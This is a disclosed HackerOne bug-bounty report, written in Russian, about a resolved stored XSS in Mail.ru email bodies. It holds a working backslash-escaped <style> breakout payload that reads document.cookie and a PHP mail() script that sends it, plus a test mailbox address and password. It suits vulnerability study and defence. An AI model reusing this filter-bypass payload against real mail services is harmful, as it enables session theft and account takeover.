---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '269458'
original_report_id: '269458'
title: XSS в письме, в теле письма.
weakness: Cross-site Scripting (XSS) - Stored
team_handle: mailru
created_at: '2017-09-19T11:46:16.592Z'
disclosed_at: '2018-01-26T14:20:12.766Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 10
asset_identifier: e.mail.ru
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# XSS в письме, в теле письма.

## Metadata

- HackerOne Report ID: 269458
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: mailru
- Disclosed At: 2018-01-26T14:20:12.766Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Здравствуйте!
XSS срабатывает на e.mail.ru, m.mail.ru, light.mail.ru и в мобильном приложении.
Уязвимость присутствует в параметрах стилей, в <style>{...здесь...}</style> 
срабатывает, если экранировать символы.

Рабочий вектор (здесь одиночные бэкслэш, в примере ещё ниже хостинг обрезал до одиночных):


<style>
#i\{\<\/\s\t\y\le\>\<\i\m\g\20\o\ne\r\r\o\r\=\"a\le\r\t\(d\oc\u\me\nt\.c\o\o\kie\)\"\s\rc\=\'eeeeeee\'\20\>{
}
</style>


Отправка письма осуществляется php скриптом, функцией mail()<br>
Пример:

<?php
$from = "test_xss <xss_in@body.style.ru>";
$hs = "From: $from\r\n";
$hs .= "Content-type: text/html; charset=UTF-8\r\n";
if(mail("hackerone.one@mail.ru", "subj", "<style>
#i\\{\\<\\/\\s\\t\\y\\le\\>\\<\\i\\m\\g\\20\\o\\ne\\r\\r\\o\\r\\=\\'a\\le\\r\\t\\(d\\oc\\u\\me\\nt\\.c\\o\\o\\kie\\)\\'\\s\\rc\\=\\'eeeeeee\\'\\20\\>{
}
</style>
text", $hs)){
echo "good";
}
?>


Срабатывает xss не в каждой почте, но из пяти моих ящиков, сработало в трёх. 
Предполагаю, вы вносите изменения в систему :)
На одном из ящиков, то срабатывает, то через +/- час нет.
Тестил в ящике: cloud.mail-ru@mail.ru, пароль: ItsHackNewton
В приложенном видео вывод cookie и файл php для отправки, т.к в данном тикете тоже экранирует двойные бэкслэши.
Поиск уязвимости производился вручную, без использования программ. 

С уважением, Максим.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
